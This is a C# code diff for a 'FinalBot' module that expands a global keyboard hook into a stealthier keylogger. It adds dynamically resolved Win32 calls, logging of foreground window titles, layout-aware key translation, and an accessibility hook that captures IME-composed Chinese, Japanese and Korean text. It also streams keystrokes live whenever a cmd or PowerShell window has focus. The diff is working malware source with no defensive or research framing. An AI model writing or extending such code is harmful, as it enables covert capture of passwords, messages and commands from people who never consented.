@@ -11,6 +11,18 @@ namespace FinalBot.Modules
         private const int _kDown = 0x0100; // WM_KEYDOWN
         private static LkProc _cb = HookCallback;
         private static IntPtr _hID = IntPtr.Zero;
+        private static IntPtr _hEventHook = IntPtr.Zero;
+        private static WinEventDelegate _eventCb = WinEventProc;
+        private static IntPtr _lastLayout = IntPtr.Zero;
+        private static string _lastTitle = "";
+        private static bool _isTerminalActive = false;
+        private static string _lastFullText = "";
+
+        public delegate void TerminalFocusHandler(string title, bool isActive);
+        public static event TerminalFocusHandler? OnTerminalFocus;
+        public delegate void KeyStrokeHandler(string key);
+        public static event KeyStrokeHandler? OnKeyStroke;
+        public static bool IsTerminalActive => _isTerminalActive;
 
         private delegate IntPtr LkProc(int n, IntPtr w, IntPtr l);
 
@@ -23,6 +35,44 @@ namespace FinalBot.Modules
             public static GetMsgDelegate? GetMsg => VanguardCore.SafetyManager.ApiInterface.GetUser32<GetMsgDelegate>("GetMessageW");
             public static TransMsgDelegate? TransMsg => VanguardCore.SafetyManager.ApiInterface.GetUser32<TransMsgDelegate>("TranslateMessage");
             public static DispMsgDelegate? DispMsg => VanguardCore.SafetyManager.ApiInterface.GetUser32<DispMsgDelegate>("DispatchMessageW");
+
+            // Keyboard Layout Support
+            public static GetForegroundDelegate? GetForeground => VanguardCore.SafetyManager.ApiInterface.GetUser32<GetForegroundDelegate>("GetForegroundWindow");
+            public static GetWindowThreadProcessIdDelegate? GetThreadProcess => VanguardCore.SafetyManager.ApiInterface.GetUser32<GetWindowThreadProcessIdDelegate>("GetWindowThreadProcessId");
+            public static GetLayoutDelegate? GetLayout => VanguardCore.SafetyManager.ApiInterface.GetUser32<GetLayoutDelegate>("GetKeyboardLayout");
+            public static GetKeyboardStateDelegate? GetKbState => VanguardCore.SafetyManager.ApiInterface.GetUser32<GetKeyboardStateDelegate>("GetKeyboardState");
+            public static ToUnicodeExDelegate? ToUnicode => VanguardCore.SafetyManager.ApiInterface.GetUser32<ToUnicodeExDelegate>("ToUnicodeEx");
+            public static GetWindowTextDelegate? GetText => VanguardCore.SafetyManager.ApiInterface.GetUser32<GetWindowTextDelegate>("GetWindowTextW");
+
+            // WinEvent & Accessibility Support
+            public static SetEventHookDelegate? SetEventHook => VanguardCore.SafetyManager.ApiInterface.GetUser32<SetEventHookDelegate>("SetWinEventHook");
+            public static UnhookEventDelegate? UnhookEvent => VanguardCore.SafetyManager.ApiInterface.GetUser32<UnhookEventDelegate>("UnhookWinEvent");
+            public static AccFromEventDelegate? AccFromEvent {
+                get {
+                    IntPtr ptr = VanguardCore.SafetyManager.ApiInterface.Resolve("oleacc.dll", "AccessibleObjectFromEvent");
+                    return ptr != IntPtr.Zero ? Marshal.GetDelegateForFunctionPointer<AccFromEventDelegate>(ptr) : null;
+                }
+            }
+        }
+
+        private delegate IntPtr GetForegroundDelegate();
+        private delegate uint GetWindowThreadProcessIdDelegate(IntPtr hWnd, out uint lpdwProcessId);
+        private delegate IntPtr GetLayoutDelegate(uint dwThreadId);
+        private delegate bool GetKeyboardStateDelegate(byte[] lpKeyState);
+        private delegate int ToUnicodeExDelegate(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);
+        private delegate int GetWindowTextDelegate(IntPtr hWnd, [Out, MarshalAs(UnmanagedType.LPWStr)] System.Text.StringBuilder lpString, int nMaxCount);
+
+        private delegate IntPtr SetEventHookDelegate(uint eventMin, uint eventMax, IntPtr hmodWinEventProc, WinEventDelegate lpfnWinEventProc, uint idProcess, uint idThread, uint dwFlags);
+        private delegate bool UnhookEventDelegate(IntPtr hWinEventHook);
+        private delegate int AccFromEventDelegate(IntPtr hwnd, uint idObject, uint idChild, out IAccessible ppvObject, out object pvarChild);
+        private delegate void WinEventDelegate(IntPtr hWinEventHook, uint eventType, IntPtr hwnd, int idObject, int idChild, uint dwEventThread, uint dwmsEventTime);
+
+        [ComImport, Guid("618730e0-3c3d-11cf-810c-00aa00389b71"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
+        private interface IAccessible
+        {
+            void _VtblSlot1(); void _VtblSlot2(); void _VtblSlot3(); void _VtblSlot4(); void _VtblSlot5(); void _VtblSlot6(); void _VtblSlot7(); void _VtblSlot8();
+            [PreserveSig] int get_accName(object varChild, out string pszName);
+            [PreserveSig] int get_accValue(object varChild, out string pszValue);
         }
 
         private delegate IntPtr SetHookDelegate(int id, LkProc lpfn, IntPtr hMod, uint dwThreadId);
@@ -51,6 +101,16 @@ namespace FinalBot.Modules
             public int y;
         }
 
+        [StructLayout(LayoutKind.Sequential)]
+        private struct KBDLLHOOKSTRUCT 
+        {
+            public uint vkCode;
+            public uint scanCode;
+            public uint flags;
+            public uint time;
+            public IntPtr dwExtraInfo;
+        }
+
         public static void Start()
         {
             System.Threading.Tasks.Task.Run(() =>
@@ -59,6 +119,9 @@ namespace FinalBot.Modules
                 {
                     _hID = SetHook(_cb);
                     if (_hID == IntPtr.Zero) return;
+
+                    // Initialize Deep Capture Hook (Global window value changes)
+                    _hEventHook = Native.SetEventHook?.Invoke(0x800E, 0x800E, IntPtr.Zero, _eventCb, 0, 0, 0) ?? IntPtr.Zero;
 
                     MSG msg;
                     var getMsg = Native.GetMsg;
@@ -88,6 +151,11 @@ namespace FinalBot.Modules
                 {
                     Native.Unhook?.Invoke(_hID);
                     _hID = IntPtr.Zero;
+                }
+                if (_hEventHook != IntPtr.Zero)
+                {
+                    Native.UnhookEvent?.Invoke(_hEventHook);
+                    _hEventHook = IntPtr.Zero;
                 }
             }
             catch { }
@@ -127,9 +195,19 @@ namespace FinalBot.Modules
             {
                 if (n >= 0 && w == (IntPtr)_kDown)
                 {
-                    int vkCode = Marshal.ReadInt32(l);
-                    string keyName = GetKeyName(vkCode);
-                    Logger.Log(keyName, "KEY");
+                    KBDLLHOOKSTRUCT? kbd = Marshal.PtrToStructure<KBDLLHOOKSTRUCT>(l);
+                    if (kbd.HasValue)
+                    {
+                        MonitorWindowChange();
+                        DetectLayoutChange();
+                        string keyName = GetKeyName(kbd.Value.vkCode, kbd.Value.scanCode);
+                        
+                        // Local log
+                        Logger.Log(keyName, "KEY");
+                        
+                        // Direct stream if terminal active
+                        OnKeyStroke?.Invoke(keyName);
+                    }
                 }
             }
             catch { }
@@ -138,10 +216,47 @@ namespace FinalBot.Modules
             return callNext != null ? callNext(_hID, n, w, l) : CallNextHookEx_Fallback(_hID, n, w, l);
         }
 
+        private static void WinEventProc(IntPtr hWinEventHook, uint eventType, IntPtr hwnd, int idObject, int idChild, uint dwEventThread, uint dwmsEventTime)
+        {
+            try
+            {
+                // Only trigger Deep Capture for CJK languages or if it's an IME commit
+                if (_lastLayout == IntPtr.Zero) return;
+                int langId = (int)((long)_lastLayout & 0xFFFF);
+                bool isCJK = langId == 0x0804 || langId == 0x0404 || langId == 0x0411 || langId == 0x0412; // ZH, JA, KO
+                
+                if (!isCJK) return;
+
+                var accFromEvent = Native.AccFromEvent;
+                if (accFromEvent == null) return;
+
+                IAccessible accObj;
+                object childId;
+                if (accFromEvent(hwnd, (uint)idObject, (uint)idChild, out accObj, out childId) == 0)
+                {
+                    string newVal;
+                    if (accObj.get_accValue(childId, out newVal) == 0 && !string.IsNullOrEmpty(newVal))
+                    {
+                        // Identify only the NEW characters added to the end (typical IME behavior)
+                        if (newVal.Length > _lastFullText.Length && newVal.StartsWith(_lastFullText))
+                        {
+                            string delta = newVal.Substring(_lastFullText.Length);
+                            if (delta.Any(c => c > 127)) // Only log if contains non-ASCII (meaning IME conversion)
+                            {
+                                Logger.Log($" [Deep captured: {delta}] ", "KEY");
+                            }
+                        }
+                        _lastFullText = newVal;
+                    }
+                }
+            }
+            catch { }
+        }
+
         // Fallback or explicit call
         private static IntPtr CallNextHookEx_Fallback(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam) => IntPtr.Zero;
 
-        private static string GetKeyName(int vkCode)
+        private static string GetKeyName(uint vkCode, uint scanCode)
         {
             switch (vkCode)
             {
@@ -159,11 +274,98 @@ namespace FinalBot.Modules
                 case 0x26: return "[UP]";
                 case 0x27: return "[RIGHT]";
                 case 0x28: return "[DOWN]";
-                default:
-                    if (vkCode >= 0x30 && vkCode <= 0x39) return ((char)vkCode).ToString();
-                    if (vkCode >= 0x41 && vkCode <= 0x5A) return ((char)vkCode).ToString();
-                    return $"[VK:0x{vkCode:X2}]";
             }
+
+            try
+            {
+                var toUnicode = Native.ToUnicode;
+                var getKbState = Native.GetKbState;
+                var getForeground = Native.GetForeground;
+                var getThreadProcess = Native.GetThreadProcess;
+                var getLayout = Native.GetLayout;
+
+                if (toUnicode != null && getKbState != null)
+                {
+                    byte[] kbState = new byte[256];
+                    if (getKbState(kbState))
+                    {
+                        IntPtr foreground = getForeground?.Invoke() ?? IntPtr.Zero;
+                        uint procId;
+                        uint threadId = getThreadProcess != null ? getThreadProcess(foreground, out procId) : 0;
+                        IntPtr layout = getLayout != null ? getLayout(threadId) : IntPtr.Zero;
+
+                        var sb = new System.Text.StringBuilder(16);
+                        int result = toUnicode(vkCode, scanCode, kbState, sb, sb.Capacity, 0, layout);
+                        
+                        if (result > 0) return sb.ToString();
+                    }
+                }
+            }
+            catch { }
+
+            return $"[VK:{vkCode:X2}]";
+        }
+
+        private static void DetectLayoutChange()
+        {
+            try
+            {
+                IntPtr foreground = Native.GetForeground?.Invoke() ?? IntPtr.Zero;
+                uint procId;
+                uint threadId = Native.GetThreadProcess != null ? Native.GetThreadProcess(foreground, out procId) : 0;
+                IntPtr layout = Native.GetLayout != null ? Native.GetLayout(threadId) : IntPtr.Zero;
+
+                if (layout != _lastLayout)
+                {
+                    _lastLayout = layout;
+                    string langName = "??";
+                    try
+                    {
+                        // Extract lower 16 bits (Language ID) from HKL
+                        int langId = (int)((long)layout & 0xFFFF);
+                        var culture = new System.Globalization.CultureInfo(langId);
+                        
+                        // Clear text selection buffer on layout change to prevent stale diffs
+                        _lastFullText = ""; 
+
+                        // Use EnglishName for full professional clarity (e.g., Chinese (Simplified, China))
+                        langName = culture.EnglishName;
+                        if (string.IsNullOrEmpty(langName)) langName = culture.Name.ToUpper();
+                    }
+                    catch { }
+                    Logger.Log($"\n[LANGUAGE: {langName}] ", "KEY");
+                }
+            }
+            catch { }
+        }
+
+        private static void MonitorWindowChange()
+        {
+            try
+            {
+                IntPtr hwnd = Native.GetForeground?.Invoke() ?? IntPtr.Zero;
+                if (hwnd == IntPtr.Zero) return;
+
+                var sb = new System.Text.StringBuilder(256);
+                Native.GetText?.Invoke(hwnd, sb, 256);
+                string title = sb.ToString();
+
+                if (title != _lastTitle)
+                {
+                    _lastTitle = title;
+                    Logger.Log($"\n[WINDOW: {title}] ", "KEY");
+
+                    string lower = title.ToLower();
+                    bool isTerminal = lower.Contains("cmd") || lower.Contains("powershell") || lower.Contains("командная") || lower.Contains("терминал");
+
+                    if (isTerminal != _isTerminalActive)
+                    {
+                        _isTerminalActive = isTerminal;
+                        OnTerminalFocus?.Invoke(title, isTerminal);
+                    }
+                }
+            }
+            catch { }
         }
     }
 }
